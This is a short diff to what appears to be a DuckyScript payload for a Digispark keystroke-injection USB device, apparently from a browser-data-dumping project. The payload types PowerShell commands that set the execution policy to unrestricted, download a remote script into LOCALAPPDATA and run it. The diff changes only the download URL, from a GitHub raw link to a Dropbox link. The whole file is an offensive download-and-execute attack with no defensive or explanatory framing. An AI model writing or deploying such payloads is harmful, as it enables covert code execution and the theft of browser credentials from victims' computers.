@@ -20,5 +20,5 @@ DELAY 3000
 STRING set-executionpolicy unrestricted
 ENTER
 DELAY 500
-STRING (new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/LeozinH1/BrowserDumpDigispark/main/script.ps1", "$($env:LOCALAPPDATA)\script.ps1"); powershell "$($env:LOCALAPPDATA)\script.ps1";
+STRING (new-object System.Net.WebClient).DownloadFile("https://www.dropbox.com/s/sbaj1fp448hj43p/script.ps1?dl=1", "$($env:LOCALAPPDATA)\script.ps1"); powershell "$($env:LOCALAPPDATA)\script.ps1";
 ENTER
